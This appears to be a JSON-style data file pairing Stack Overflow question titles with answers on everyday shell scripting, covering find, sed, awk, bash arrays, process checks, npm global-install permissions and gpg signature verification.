    "Use find command but exclude files in two directories": "Here's how you can specify that with find:\nfind . -type f -name \"*_peaks.bed\" ! -path \"./tmp/*\" ! -path \"./scripts/*\"\nExplanation:\nfind . - Start find from current working directory (recursively by default)\n-type f - Specify to find that you only want files in the results\n-name \"*_peaks.bed\" - Look for files with the name ending in _peaks.bed\n! -path \"./tmp/*\" - Exclude all results whose path starts with ./tmp/\n! -path \"./scripts/*\" - Also exclude all results whose path starts with ./scripts/\nTesting the Solution:\n$ mkdir a b c d e\n$ touch a/1 b/2 c/3 d/4 e/5 e/a e/b\n$ find . -type f ! -path \"./a/*\" ! -path \"./b/*\"\n\n./d/4\n./c/3\n./e/a\n./e/b\n./e/5\nYou were pretty close, the -name option only considers the basename, where as -path considers the entire path =)",
    "Forcing bash to expand variables in a string loaded from a file": "I stumbled on what I think is THE answer to this question: the envsubst command:\necho \"hello \\$FOO world\" > source.txt\nexport FOO=42\nenvsubst < source.txt\nThis outputs: hello 42 world\nIf you would like to continue work on the data in a file destination.txt, push this back to a file like this:\nenvsubst < source.txt > destination.txt\nIn case it's not already available in your distro, it's in the GNU package gettext.\n@Rockallite\nI wrote a little wrapper script to take care of the '$' problem.\n(BTW, there is a \"feature\" of envsubst, explained at https://unix.stackexchange.com/a/294400/7088 for expanding only some of the variables in the input, but I agree that escaping the exceptions is much more convenient.)\nHere's my script:\n#! /bin/bash\n      ## -*-Shell-Script-*-\nCmdName=${0##*/}\nUsage=\"usage: $CmdName runs envsubst, but allows '\\$' to  keep variables from\n    being expanded.\n  With option   -sl   '\\$' keeps the back-slash.\n  Default is to replace  '\\$' with '$'\n\"\n\nif [[ $1 = -h ]]  ;then echo -e >&2  \"$Usage\" ; exit 1 ;fi\nif [[ $1 = -sl ]] ;then  sl='\\'  ; shift ;fi\n\nsed 's/\\\\\\$/\\${EnVsUbDolR}/g' |  EnVsUbDolR=$sl\\$  envsubst  \"$@\"",
    "How do I reload ZSH config files without replacing the current shell?": "Usually a source ~/.zshrc should do it.",
    "Validating parameters to a Bash script": "#!/bin/sh\ndie () {\n    echo >&2 \"$@\"\n    exit 1\n}\n\n[ \"$#\" -eq 1 ] || die \"1 argument required, $# provided\"\necho $1 | grep -E -q '^[0-9]+$' || die \"Numeric argument required, $1 provided\"\n\nwhile read dir \ndo\n    [ -d \"$dir\" ] || die \"Directory $dir does not exist\"\n    rm -rf \"$dir\"\ndone <<EOF\n~/myfolder1/$1/anotherfolder \n~/myfolder2/$1/yetanotherfolder \n~/myfolder3/$1/thisisafolder\nEOF\nedit: I missed the part about checking if the directories exist at first, so I added that in, completing the script. Also, have addressed issues raised in comments; fixed the regular expression, switched from == to eq.\nThis should be a portable, POSIX compliant script as far as I can tell; it doesn't use any bashisms, which is actually important because /bin/sh on Ubuntu is actually dash these days, not bash.",
    "How to pass array as an argument to a function in Bash": "You cannot pass an array, you can only pass its elements (i.e. the expanded array).\n#!/bin/bash\nfunction f() {\n    a=(\"$@\")\n    ((last_idx=${#a[@]} - 1))\n    b=${a[last_idx]}\n    unset a[last_idx]\n\n    for i in \"${a[@]}\" ; do\n        echo \"$i\"\n    done\n    echo \"b: $b\"\n}\n\nx=(\"one two\" \"LAST\")\nb='even more'\n\nf \"${x[@]}\" \"$b\"\necho ===============\nf \"${x[*]}\" \"$b\"\nThe other possibility would be to pass the array by name:\n#!/bin/bash\nfunction f() {\n    name=$1[@]\n    b=$2\n    a=(\"${!name}\")\n\n    for i in \"${a[@]}\" ; do\n        echo \"$i\"\n    done\n    echo \"b: $b\"\n}\n\nx=(\"one two\" \"LAST\")\nb='even more'\n\nf x \"$b\"",
    "How to check if a postgres user exists?": "SELECT 1 FROM pg_roles WHERE rolname='USR_NAME'\nAnd in terms of command line (thanks to Erwin):\npsql postgres -tXAc \"SELECT 1 FROM pg_roles WHERE rolname='USR_NAME'\"\nYields 1 if found and nothing else.\nThat is:\npsql postgres -tXAc \"SELECT 1 FROM pg_roles WHERE rolname='USR_NAME'\" | grep -q 1 || createuser ...",
    "Using sed to mass rename files": "First, I should say that the easiest way to do this is to use the prename or rename commands.\nOn Ubuntu, OSX (Homebrew package rename, MacPorts package p5-file-rename), or other systems with perl rename (prename):\nrename s/0000/000/ F0000*\nor on systems with rename from util-linux-ng, such as RHEL:\nrename 0000 000 F0000*\nThat's a lot more understandable than the equivalent sed command.\nBut as for understanding the sed command, the sed manpage is helpful. If you run man sed and search for & (using the / command to search), you'll find it's a special character in s/foo/bar/ replacements.\n  s/regexp/replacement/\n         Attempt  to match regexp against the pattern space.  If success\u2010\n         ful,  replace  that  portion  matched  with  replacement.    The\n         replacement may contain the special character & to refer to that\n         portion of the pattern space  which  matched,  and  the  special\n         escapes  \\1  through  \\9  to refer to the corresponding matching\n         sub-expressions in the regexp.\nTherefore, \\(.\\) matches the first character, which can be referenced by \\1. Then . matches the next character, which is always 0. Then \\(.*\\) matches the rest of the filename, which can be referenced by \\2.\nThe replacement string puts it all together using & (the original filename) and \\1\\2 which is every part of the filename except the 2nd character, which was a 0.\nThis is a pretty cryptic way to do this, IMHO. If for some reason the rename command was not available and you wanted to use sed to do the rename (or perhaps you were doing something too complex for rename?), being more explicit in your regex would make it much more readable. Perhaps something like:\nls F00001-0708-*|sed 's/F0000\\(.*\\)/mv & F000\\1/' | sh\nBeing able to see what's actually changing in the s/search/replacement/ makes it much more readable. Also it won't keep sucking characters out of your filename if you accidentally run it twice or something.",
    "node.js shell command execution": "There are three issues here that need to be fixed:\nFirst is that you are expecting synchronous behavior while using stdout asynchronously. All of the calls in your run_cmd function are asynchronous, so it will spawn the child process and return immediately regardless of whether some, all, or none of the data has been read off of stdout. As such, when you run\nconsole.log(foo.stdout);\nyou get whatever happens to be stored in foo.stdout at the moment, and there's no guarantee what that will be because your child process might still be running.\nSecond is that stdout is a readable stream, so 1) the data event can be called multiple times, and 2) the callback is given a buffer, not a string. Easy to remedy; just change\nfoo = new run_cmd(\n    'netstat.exe', ['-an'], function (me, data){me.stdout=data;}\n);\ninto\nfoo = new run_cmd(\n    'netstat.exe', ['-an'], function (me, buffer){me.stdout+=buffer.toString();}\n);\nso that we convert our buffer into a string and append that string to our stdout variable.\nThird is that you can only know you've received all output when you get the 'end' event, which means we need another listener and callback:\nfunction run_cmd(cmd, args, cb, end) {\n    // ...\n    child.stdout.on('end', end);\n}\nSo, your final result is this:\nfunction run_cmd(cmd, args, cb, end) {\n    var spawn = require('child_process').spawn,\n        child = spawn(cmd, args),\n        me = this;\n    child.stdout.on('data', function (buffer) { cb(me, buffer) });\n    child.stdout.on('end', end);\n}\n\n// Run C:\\Windows\\System32\\netstat.exe -an\nvar foo = new run_cmd(\n    'netstat.exe', ['-an'],\n    function (me, buffer) { me.stdout += buffer.toString() },\n    function () { console.log(foo.stdout) }\n);",
    "How to get the last part of dirname in Bash": "You can use basename even though it's not a file. Strip off the file name using dirname, then use basename to get the last element of the string:\ndir=\"/from/here/to/there.txt\"\ndir=\"$(dirname $dir)\"   # Returns \"/from/here/to\"\ndir=\"$(basename $dir)\"  # Returns just \"to\"",
    "Can colorized output be captured via shell redirect? [duplicate]": "One way to capture colorized output is with the script command. Running script will start a bash session where all of the raw output is captured to a file (named typescript by default).",
    "How to make a shell script global?": "/usr/local/bin would be the most appropriate location. Mac OS X has it in the PATH by default",
    "Ignoring specific errors in a shell script": "In order to cause bash to ignore errors for specific commands you can say:\nsome-arbitrary-command || true\nThis would make the script continue. For example, if you have the following script:\n$ cat foo\nset -e\necho 1\nsome-arbitrary-command || true\necho 2\nExecuting it would return:\n$ bash foo\n1\nz: line 3: some-arbitrary-command: command not found\n2\nIn the absence of || true in the command line, it'd have produced:\n$ bash foo\n1\nz: line 3: some-arbitrary-command: command not found\nQuote from the manual:\nThe shell does not exit if the command that fails is part of the command list immediately following a while or until keyword, part of the test in an if statement, part of any command executed in a && or || list except the command following the final && or ||, any command in a pipeline but the last, or if the command\u2019s return status is being inverted with !. A trap on ERR, if set, is executed before the shell exits.\nEDIT: In order to change the behaviour such that in the execution should continue only if executing some-arbitrary-command returned file not found as part of the error, you can say:\n[[ $(some-arbitrary-command 2>&1) =~ \"file not found\" ]]\nAs an example, execute the following (no file named MissingFile.txt exists):\n$ cat foo \n#!/bin/bash\nset -u\nset -e\nfoo() {\n  rm MissingFile.txt\n}\necho 1\n[[ $(foo 2>&1) =~ \"No such file\" ]]\necho 2\n$(foo)\necho 3\nThis produces the following output:\n$ bash foo \n1\n2\nrm: cannot remove `MissingFile.txt': No such file or directory\nNote that echo 2 was executed but echo 3 wasn't.",
    "Open a file from Cygwin": "You can also use the cygwin utility:\ncygstart <your file>\nTo make things OSX-like add the following to your bashrc\nalias open='cygstart'\nDon't forget to check out the man page for cygstart.",
    "How do I declare a constant in shell script?": "I believe you can do something like:\nreadonly DATA=/usr/home/data/file.dat\nYou can also do:\ndeclare -r var=123",
    "Why is an MD5 hash created by Python different from one created using echo and md5sum in the shell?": "echo appends a \\n since you usually do not want lines not ending with a linebreak in your shell (it looks really ugly if the prompt does not start at the very left).\nUse the -n argument to omit the trailing linebreak and it will print the same checksum as your python script:\n> echo -n mystringforhash | md5sum\n86b6423cb6d211734fc7d81bbc5e11d3  -",
    "How to write a shell script that starts tmux session, and then runs a ruby script": "#!/bin/bash\ntmux new-session -d -s my_session 'ruby run.rb'\nCreate a file named my_script.sh and give it the above contents.\nMake the file executable by running:\nchmod 755 my_script.sh or chmod +x my_script.sh\nThen run the shell script:\n./my_script.sh\nMaking the shell script executable\nWhen you perform the chmod 755 filename command you allow everyone to read and execute the file, and the file owner is allowed to write to the file as well. You may need this for Perl and other scripts that should be run via a webserver. If you apply 755 to a directory, it means that everyone can go to it and get its file listing.\nThese permissions are usually translated into textual representation of rwxr-xr-x.\nYou can alternatively use chmod +x file_name on a file to make it executable.",
    "What tool to use to draw file tree diagram [closed]": "Copying and pasting from the MS-DOS tree command might also work for you. Examples:\ntree\nC:\\Foobar>tree\nC:.\n\u251c\u2500\u2500\u2500FooScripts\n\u251c\u2500\u2500\u2500barconfig\n\u251c\u2500\u2500\u2500Baz\n\u2502   \u251c\u2500\u2500\u2500BadBaz\n\u2502   \u2514\u2500\u2500\u2500Drop\n...\ntree /F\nC:\\Foobar>tree\nC:.\n\u251c\u2500\u2500\u2500FooScripts\n\u2502    foo.sh\n\u251c\u2500\u2500\u2500barconfig\n\u2502    bar.xml\n\u251c\u2500\u2500\u2500Baz\n\u2502   \u251c\u2500\u2500\u2500BadBaz\n\u2502   \u2502    badbaz.xml\n\u2502   \u2514\u2500\u2500\u2500Drop\n...\ntree /A\nC:\\Foobar>tree /A\nC:.\n+---FooScripts\n+---barconfig\n+---Baz\n\u00a6   +---BadBaz\n\u00a6   \\---Drop\n...\ntree /F /A\nC:\\Foobar>tree /A\nC:.\n+---FooScripts\n\u00a6    foo.sh\n+---barconfig\n\u00a6    bar.xml\n+---Baz\n\u00a6   +---BadBaz\n\u00a6   \u00a6    badbaz.xml\n\u00a6   \\---Drop\n...\nSyntax [source]\ntree [drive:][path] [/F] [/A]\ndrive:\\path \u2014 Drive and directory containing disk for display of directory structure, without listing files.\n/F \u2014 Include all files living in every directory.\n/A \u2014 Replace graphic characters used for linking lines with ext characters , instead of graphic characters. /a is used with code pages that do not support graphic characters and to send output to printers that do not properly interpret graphic characters.",
    "To show only file name without the entire directory path": "ls whateveryouwant | xargs -n 1 basename\nDoes that work for you?\nOtherwise you can (cd /the/directory && ls) (yes, parentheses intended)",
    "While loop to test if a file exists in bash": "When you say \"doesn't work\", how do you know it doesn't work?\nYou might try to figure out if the file actually exists by adding:\nwhile [ ! -f /tmp/list.txt ]\ndo\n  sleep 2 # or less like 0.2\ndone\nls -l /tmp/list.txt\nYou might also make sure that you're using a Bash (or related) shell by typing 'echo $SHELL'. I think that CSH and TCSH use a slightly different semantic for this loop.",
    "bash - how to pipe result from the which command to cd": "You use pipe in cases where the command expects parameters from the standard input. ( More on this ).\nWith cd command that is not the case. The directory is the command argument. In such case, you can use command substitution. Use backticks or $(...) to evaluate the command, store it into variable..\npath=`which oracle`\necho $path # just for debug\ncd $path\nalthough it can be done in a much simpler way:\ncd `which oracle` \nor if your path has special characters\ncd \"`which oracle`\"\nor\ncd $(which oracle)\nwhich is equivalent to backtick notation, but is recommended (backticks can be confused with apostrophes)\n.. but it looks like you want:\ncd $(dirname $(which oracle))\n(which shows you that you can use nesting easily)\n$(...) (as well as backticks) work also in double-quoted strings, which helps when the result may eventually contain spaces..\ncd \"$(dirname \"$(which oracle)\")\"\n(Note that both outputs require a set of double quotes.)",
    "envsubst: command not found on Mac OS X 10.8": "brew install gettext\nbrew link --force gettext \nThis will enable envsubst on OS X, and force it to link properly. It requires homebrew to be installed.",
    "Linux/Unix command to determine if process is running?": "While pidof and pgrep are great tools for determining what's running, they are both, unfortunately, unavailable on some operating systems. A definite fail safe would be to use the following: ps cax | grep command\nThe output on Gentoo Linux:\n14484 ?        S      0:00 apache2\n14667 ?        S      0:00 apache2\n19620 ?        Sl     0:00 apache2\n21132 ?        Ss     0:04 apache2\nThe output on OS X:\n42582   ??  Z      0:00.00 (smbclient)\n46529   ??  Z      0:00.00 (smbclient)\n46539   ??  Z      0:00.00 (smbclient)\n46547   ??  Z      0:00.00 (smbclient)\n46586   ??  Z      0:00.00 (smbclient)\n46594   ??  Z      0:00.00 (smbclient)\nOn both Linux and OS X, grep returns an exit code so it's easy to check if the process was found or not:\n#!/bin/bash\nps cax | grep httpd > /dev/null\nif [ $? -eq 0 ]; then\n  echo \"Process is running.\"\nelse\n  echo \"Process is not running.\"\nfi\nFurthermore, if you would like the list of PIDs, you could easily grep for those as well:\nps cax | grep httpd | grep -o '^[ ]*[0-9]*'\nWhose output is the same on Linux and OS X:\n3519 3521 3523 3524\nThe output of the following is an empty string, making this approach safe for processes that are not running:\necho ps cax | grep aasdfasdf | grep -o '^[ ]*[0-9]*'\nThis approach is suitable for writing a simple empty string test, then even iterating through the discovered PIDs.\n#!/bin/bash\nPROCESS=$1\nPIDS=`ps cax | grep $PROCESS | grep -o '^[ ]*[0-9]*'`\nif [ -z \"$PIDS\" ]; then\n  echo \"Process not running.\" 1>&2\n  exit 1\nelse\n  for PID in $PIDS; do\n    echo $PID\n  done\nfi\nYou can test it by saving it to a file (named \"running\") with execute permissions (chmod +x running) and executing it with a parameter: ./running \"httpd\"\n#!/bin/bash\nps cax | grep httpd\nif [ $? -eq 0 ]; then\n  echo \"Process is running.\"\nelse\n  echo \"Process is not running.\"\nfi\nWARNING!!!\nPlease keep in mind that you're simply parsing the output of ps ax which means that, as seen in the Linux output, it is not simply matching on processes, but also the arguments passed to that program. I highly recommend being as specific as possible when using this method (e.g. ./running \"mysql\" will also match 'mysqld' processes). I highly recommend using which to check against a full path where possible.\nReferences:\nhttp://linux.about.com/od/commands/l/blcmdl1_ps.htm\nhttp://linux.about.com/od/commands/l/blcmdl1_grep.htm",
    "Strengths of Shell Scripting compared to Python [closed]": "Shell scripting has simpler notations for I/O redirection.\nIt is simpler to create pipelines out of existing programs in shell.\nShell scripting reuses entire programs.\nShell is universally available (on anything like Unix) - Python is not necessarily installed.\n'Tis true that you can do everything in Python that you can do in shell; 'tis also true that there are things that are easy in Python that are hard in shell (just as there are things that are easy in shell but hard in Python). Knowing both will be best in the long term.",
    "How to check if $? is not equal to zero in unix shell scripting?": "Put it in a variable first and then try to test it, as shown below\nret=$?\nif [ $ret -ne 0 ]; then\n        echo \"In If\"\nelse\n        echo \"In Else\"\nfi\nThis should help.\nEdit: If the above is not working as expected then, there is a possibility that you are not using $? at right place. It must be the very next line after the command of which you need to catch the return status. Even if there is any other single command in between the target and you catching it's return status, you'll be retrieving the returns_status of this intermediate command and not the one you are expecting.",
    "How to print lines between two patterns, inclusive or exclusive (in sed, AWK or Perl)?": "Print lines between PAT1 and PAT2\n$ awk '/PAT1/,/PAT2/' file\nPAT1\n3    - first block\n4\nPAT2\nPAT1\n7    - second block\nPAT2\nPAT1\n10    - third block\nOr, using variables:\nawk '/PAT1/{flag=1} flag; /PAT2/{flag=0}' file\nHow does this work?\n/PAT1/ matches lines having this text, as well as /PAT2/ does.\n/PAT1/{flag=1} sets the flag when the text PAT1 is found in a line.\n/PAT2/{flag=0} unsets the flag when the text PAT2 is found in a line.\nflag is a pattern with the default action, which is to print $0: if flag is equal 1 the line is printed. This way, it will print all those lines occurring from the time PAT1 occurs and up to the next PAT2 is seen. This will also print the lines from the last match of PAT1 up to the end of the file.\nPrint lines between PAT1 and PAT2 - not including PAT1 and PAT2\n$ awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' file\n3    - first block\n4\n7    - second block\n10    - third block\nThis uses next to skip the line that contains PAT1 in order to avoid this being printed.\nThis call to next can be dropped by reshuffling the blocks: awk '/PAT2/{flag=0} flag; /PAT1/{flag=1}' file.\nPrint lines between PAT1 and PAT2 - including PAT1\n$ awk '/PAT1/{flag=1} /PAT2/{flag=0} flag' file\nPAT1\n3    - first block\n4\nPAT1\n7    - second block\nPAT1\n10    - third block\nBy placing flag at the very end, it triggers the action that was set on either PAT1 or PAT2: to print on PAT1, not to print on PAT2.\nPrint lines between PAT1 and PAT2 - including PAT2\n$ awk 'flag; /PAT1/{flag=1} /PAT2/{flag=0}' file\n3    - first block\n4\nPAT2\n7    - second block\nPAT2\n10    - third block\nBy placing flag at the very beginning, it triggers the action that was set previously and hence print the closing pattern but not the starting one.\nPrint lines between PAT1 and PAT2 - excluding lines from the last PAT1 to the end of file if no other PAT2 occurs\nThis is based on a solution by Ed Morton.\nawk 'flag{\n        if (/PAT2/)\n           {printf \"%s\", buf; flag=0; buf=\"\"}\n        else\n            buf = buf $0 ORS\n     }\n     /PAT1/ {flag=1}' file\nAs a one-liner:\n$ awk 'flag{ if (/PAT2/){printf \"%s\", buf; flag=0; buf=\"\"} else buf = buf $0 ORS}; /PAT1/{flag=1}' file\n3    - first block\n4\n7    - second block\n\n# note the lack of third block, since no other PAT2 happens after it\nThis keeps all the selected lines in a buffer that gets populated from the moment PAT1 is found. Then, it keeps being filled with the following lines until PAT2 is found. In that point, it prints the stored content and empties the buffer.",
    "Find multiple files and rename them in Linux": "You can use find to find all matching files recursively:\nfind . -iname \"*dbg*\" -exec rename _dbg.txt .txt '{}' \\;\nEDIT: what the '{}' and \\; are?\nThe -exec argument makes find execute rename for every matching file found. '{}' will be replaced with the path name of the file. The last token, \\; is there only to mark the end of the exec expression.\nAll that is described nicely in the man page for find:\n -exec utility [argument ...] ;\n         True if the program named utility returns a zero value as its\n         exit status.  Optional arguments may be passed to the utility.\n         The expression must be terminated by a semicolon (``;'').  If you\n         invoke find from a shell you may need to quote the semicolon if\n         the shell would otherwise treat it as a control operator.  If the\n         string ``{}'' appears anywhere in the utility name or the argu-\n         ments it is replaced by the pathname of the current file.\n         Utility will be executed from the directory from which find was\n         executed.  Utility and arguments are not subject to the further\n         expansion of shell patterns and constructs.",
    "Batch files - number of command line arguments": "Googling a bit gives you the following result from wikibooks:\nset argC=0\nfor %%x in (%*) do Set /A argC+=1\n\necho %argC%\nSeems like cmd.exe has evolved a bit from the old DOS days :)",
    "Linux shell sort file according to the second column?": "If this is UNIX:\nsort -k 2 file.txt\nYou can use multiple -k flags to sort on more than one column. For example, to sort by family name then first name as a tie breaker:\nsort -k 2,2 -k 1,1 file.txt\nRelevant options from \"man sort\":\n-k, --key=POS1[,POS2]\nstart a key at POS1, end it at POS2 (origin 1)\nPOS is F[.C][OPTS], where F is the field number and C the character position in the field. OPTS is one or more single-letter ordering options, which override global ordering options for that key. If no key is given, use the entire line as the key.\n-t, --field-separator=SEP\nuse SEP instead of non-blank to blank transition",
    "Find all storage devices attached to a Linux machine [closed]": "/proc/partitions will list all the block devices and partitions that the system recognizes. You can then try using file -s <device> to determine what kind of filesystem is present on the partition, if any.",
    "Is there a way to 'pretty' print MongoDB shell output to a file?": "The shell provides some nice but hidden features because it's an interactive environment.\nWhen you run commands from a javascript file via mongo commands.js you won't get quite identical behavior.\nThere are two ways around this.\n(1) fake out the shell and make it think you are in interactive mode\n$ mongo dbname << EOF > output.json\ndb.collection.find().pretty()\nEOF\nor\n(2) use Javascript to translate the result of a find() into a printable JSON\nmongo dbname command.js > output.json\nwhere command.js contains this (or its equivalent):\nprintjson( db.collection.find().toArray() )\nThis will pretty print the array of results, including [ ] - if you don't want that you can iterate over the array and printjson() each element.\nBy the way if you are running just a single Javascript statement you don't have to put it in a file and instead you can use:\n$ mongo --quiet dbname --eval 'printjson(db.collection.find().toArray())' > output.json",
    "Detect python version in shell script": "You could use something along the following lines:\n$ python -c 'import sys; print(sys.version_info[:])'\n(2, 6, 5, 'final', 0)\nThe tuple is documented here. You can expand the Python code above to format the version number in a manner that would suit your requirements, or indeed to perform checks on it.\nYou'll need to check $? in your script to handle the case where python is not found.\nP.S. I am using the slightly odd syntax to ensure compatibility with both Python 2.x and 3.x.",
    "List files by last edited date": "You can use:\nls -Rt\nwhere -R means recursive (include subdirectories) and -t means \"sort by last modification date\".\nTo see a list of files sorted by date modified, use:\nls -l -Rt\nAn alias can also be created to achieve this:\nalias lt='ls -lht'\nlt\nWhere -h gives a more readable output.",
    "Checking for environment variables": "Enclose the variable in double-quotes.\nif [ \"$TESTVAR\" == \"foo\" ]\nif you do that and the variable is empty, the test expands to:\nif [ \"\" == \"foo\" ]\nwhereas if you don't quote it, it expands to:\nif [  == \"foo\" ]\nwhich is a syntax error.",
    "How to get a list of programs running with nohup": "When I started with $ nohup storm dev-zookeper ,\nMETHOD1 : using jobs,\nprayagupd@prayagupd:/home/vmfest# jobs -l\n[1]+ 11129 Running                 nohup ~/bin/storm/bin/storm dev-zookeeper &\nNOTE: jobs shows nohup processes only on the same terminal session where nohup was started. If you close the terminal session or try on new session it won't show the nohup processes. Prefer METHOD2\nMETHOD2 : using ps command.\n$ ps xw\nPID  TTY      STAT   TIME COMMAND\n1031 tty1     Ss+    0:00 /sbin/getty -8 38400 tty1\n10582 ?        S      0:01 [kworker/0:0]\n10826 ?        Sl     0:18 java -server -Dstorm.options= -Dstorm.home=/root/bin/storm -Djava.library.path=/usr/local/lib:/opt/local/lib:/usr/lib -Dsto\n10853 ?        Ss     0:00 sshd: vmfest [priv] \nTTY column with ? => nohup running programs.\nDescription\nTTY column = the terminal associated with the process\nSTAT column = state of a process\nS = interruptible sleep (waiting for an event to complete)\nl = is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)\nReference\n$ man ps # then search /PROCESS STATE CODES",
    "Value too great for base (error token is \"08\") [duplicate]": "The shell tries to interpret 08 as an octal number, as it starts with a zero. Only digits 0-7 are, however, allowed in octal, as decimal 8 is octal 010. Hence 08 is not a valid number, and that's the reason for the error.\nSingle brackets are kind of \"compatibility mode\" with sh, and sh does not know about octal numbers.\nSo, if you use single square brackets, \"010\" will be interpreted as 10, while with double square brackets, \"010\" will be interpreted as 8.\nIf you use single square brackets, \"08\" will be interpreted as 8, while with double square brackets, it is not a valid number and leads to an error.\nYou can avoid the error by using the solution described here: https://stackoverflow.com/a/12821845/1419315\nif [[ ${vara#0} -lt ${varb#0} ]]\nor\nif [[ $((10#$vara)) -lt $((10#$varb)) ]]",
    "calling conda source activate from bash script": "On more recent versions of conda (4.6+), I have noticed that the following works:\neval \"$(conda shell.bash hook)\"\nconda activate <env-name>",
    "How to print all the columns after a particular number using awk?": "awk '{ s = \"\"; for (i = 9; i <= NF; i++) s = s $i \" \"; print s }'",
    "Indenting multi-line output in a shell script": "Pipe it to sed to insert 2 spaces at the beginning of each line.\ngit status | sed 's/^/  /'",
    "How to start a shell without any user configuration?": "Running bash --noprofile --norc still inherited from parent process. Based on a similar question I found that the way I interpreted this question env -i bash --norc --noprofile was what I would want.",
    "How to print the number of characters in each line of a text file": "Use Awk.\nawk '{ print length }' abc.txt",
    "Easiest way to strip newline character from input string in pasteboard": "pwd | tr -d '\\n' | pbcopy",
    "How to source a script in a Makefile?": "Makefile default shell is /bin/sh which does not implement source.\nChanging shell to /bin/bash makes it possible:\n# Makefile\n\nSHELL := /bin/bash\n\nrule:\n    source env.sh && YourCommand",
    "Include additional files in .bashrc": "Add source /whatever/file (or . /whatever/file) into .bashrc where you want the other file included.",
    "Bash regex =~ operator": "What is the operator =~ called?\nI'm not sure it has a name. The bash documentation just calls it the =~ operator.\nIs it only used to compare the right side against the left side?\nThe right side is considered an extended regular expression. If the left side matches, the operator returns 0, and 1 otherwise.\nWhy are double square brackets required when running a test?\nBecause =~ is an operator of the [[ expression ]] compound command.",
    "Error: EACCES: permission denied, access '/usr/lib/node_modules'": "It's not recommended to use sudo with npm install, follow the steps from npmjs official docs instead.\nMake a directory for global installations:\nmkdir ~/.npm-global\nConfigure npm to use the new directory path:\nnpm config set prefix '~/.npm-global'\nOpen or create a ~/.profile file and add this line:\nexport PATH=~/.npm-global/bin:$PATH\nBack on the command line, update your system variables:\nsource ~/.profile\nTest: Download a package globally without using sudo.\nnpm install -g typescript\nSource: https://docs.npmjs.com/getting-started/fixing-npm-permissions",
    "How to get child process from parent process": "Just use :\npgrep -P $your_process1_pid",
    "How to give arguments to kill via pipe [duplicate]": "kill $(ps -e | awk '/dmn/ {print $1}')",
    "Increment variable value by 1 (shell programming)": "You can use an arithmetic expansion like so:\ni=$((i+1))\nor declare i as an integer variable and use the += operator for incrementing its value.\ndeclare -i i=0\ni+=1\nor use the (( construct.\n((i++))",
    "What expands to all files in current directory recursively?": "This will work in Bash 4:\nls -l {,**/}*.ext\nIn order for the double-asterisk glob to work, the globstar option needs to be set (default: on):\nshopt -s globstar\nFrom man bash:\n    globstar\n                  If set, the pattern ** used in a filename expansion con\u2010\n                  text will match a files and zero or more directories and\n                  subdirectories.  If the pattern is followed by a /, only\n                  directories and subdirectories match.\nNow I'm wondering if there might have once been a bug in globstar processing, because now using simply ls **/*.ext I'm getting correct results.\nRegardless, I looked at the analysis kenorb did using the VLC repository and found some problems with that analysis and in my answer immediately above:\nThe comparisons to the output of the find command are invalid since specifying -type f doesn't include other file types (directories in particular) and the ls commands listed likely do. Also, one of the commands listed, ls -1 {,**/}*.* - which would seem to be based on mine above, only outputs names that include a dot for those files that are in subdirectories. The OP's question and my answer include a dot since what is being sought is files with a specific extension.\nMost importantly, however, is that there is a special issue using the ls command with the globstar pattern **. Many duplicates arise since the pattern is expanded by Bash to all file names (and directory names) in the tree being examined. Subsequent to the expansion the ls command lists each of them and their contents if they are directories.\nExample:\nIn our current directory is the subdirectory A and its contents:\nA\n\u2514\u2500\u2500 AB\n    \u2514\u2500\u2500 ABC\n        \u251c\u2500\u2500 ABC1\n        \u251c\u2500\u2500 ABC2\n        \u2514\u2500\u2500 ABCD\n            \u2514\u2500\u2500 ABCD1\nIn that tree, ** expands to \"A A/AB A/AB/ABC A/AB/ABC/ABC1 A/AB/ABC/ABC2 A/AB/ABC/ABCD A/AB/ABC/ABCD/ABCD1\" (7 entries). If you do echo ** that's the exact output you'd get and each entry is represented once. However, if you do ls ** it's going to output a listing of each of those entries. So essentially it does ls A followed by ls A/AB, etc., so A/AB gets shown twice. Also, ls is going to set each subdirectory's output apart:\n...\n<blank line>\ndirectory name:\ncontent-item\ncontent-item\nSo using wc -l counts all those blank lines and directory name section headings which throws off the count even farther.\nThis a yet another reason why you should not parse ls.\nAs a result of this further analysis, I recommend not using the globstar pattern in any circumstance other than iterating over a tree of files in this manner:\nfor entry in **\ndo\n    something \"$entry\"\ndone\nAs a final comparison, I used a Bash source repository I had handy and did this:\nshopt -s globstar dotglob\ndiff <(echo ** | tr ' ' '\\n') <(find . | sed 's|\\./||' | sort)\n0a1\n> .\nI used tr to change spaces to newlines which is only valid here since no names include spaces. I used sed to remove the leading ./ from each line of output from find. I sorted the output of find since it is normally unsorted and Bash's expansion of globs is already sorted. As you can see, the only output from diff was the current directory . output by find. When I did ls ** | wc -l the output had almost twice as many lines.",
    "How to verify downloaded file with .sig file?": "You need to import public key: C3C45C06\nCan be done in three steps.\nfind public key ID:\n$ gpg gcc-4.7.2.tar.gz.sig \ngpg: Signature made \u010ct 20. z\u00e1\u0159\u00ed 2012, 12:30:44 CEST using DSA key ID C3C45C06\ngpg: Can't check signature: No public key\nimport the public key from key server. It's usually not needed to choose key server, but it can be done with --keyserver <server>. Keyserver examples.\n$ gpg --recv-key C3C45C06\ngpg: requesting key C3C45C06 from hkp server keys.gnupg.net\ngpg: key C3C45C06: public key \"Jakub Jelinek <jakub@redhat.com>\" imported\ngpg: no ultimately trusted keys found\ngpg: Total number processed: 1\ngpg:               imported: 1\nIf the command error's out with a timeout, you may be behind a firewall that is blocking the default gpg port. Try using the `--keyserver' option with port 80 (almost all firewalls allow port 80 b/c of web browsing):\n$ gpg --keyserver hkp://${HOSTNAME}:80 --recv-keys ${KEY_ID}\nverify signature:\n$ gpg gcc-4.7.2.tar.gz.sig \ngpg: Signature made \u010ct 20. z\u00e1\u0159\u00ed 2012, 12:30:44 CEST using DSA key ID C3C45C06\ngpg: Good signature from \"Jakub Jelinek <jakub@redhat.com>\" [unknown]\ngpg: WARNING: This key is not certified with a trusted signature!\ngpg:          There is no indication that the signature belongs to the owner.\nPrimary key fingerprint: 33C2 35A3 4C46 AA3F FB29  3709 A328 C3A2 C3C4 5C06\nThe output should say \"Good signature\".\ngpg: WARNING: This key is not certified with a trusted signature!\nIs for another question ;)",
